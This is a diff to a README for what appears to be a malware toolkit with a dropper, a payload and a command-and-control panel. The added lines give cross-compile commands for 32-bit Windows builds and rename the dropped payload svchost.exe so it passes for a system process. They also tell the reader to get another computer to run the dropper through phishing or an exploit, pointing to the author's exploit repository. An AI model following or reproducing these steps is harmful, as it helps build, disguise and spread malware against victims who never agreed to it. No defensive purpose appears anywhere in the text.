@@ -34,6 +34,13 @@ x86_64-w64-mingw32-gcc -O2 -mwindows drop.c -o bingledrop.exe -lwininet
 x86_64-w64-mingw32-gcc -O2 -mwindows dropped.c -o dropped.exe -lwininet
 ```
 
+or for 32-bit systems
+
+```bash
+i686-w64-mingw32-gcc -O2 -mwindows drop.c -o bingledrop.exe -lwininet
+i686-w64-mingw32-gcc -O2 -mwindows dropped.c -o svchost.exe -lwininet
+```
+
 place dropped.exe in the payloads folder
 
 
@@ -50,7 +57,7 @@ or if accessing the CNC remotely (like SSH) visit http://<CNC IP>:<CNC port>/adm
 
 Follow the examples to build a command, and click Deploy Command
 
-Get another computer to run your dropper (bingledrop.exe by default) via phishing or an exploit
+Get another computer to run your dropper (bingledrop.exe by default) via phishing or an exploit (you can use my Eternal repository to perform an exploit on a vulnerable target, you'll usually want a 32-bit binary for this.)
 
 Boom! You're in!
 
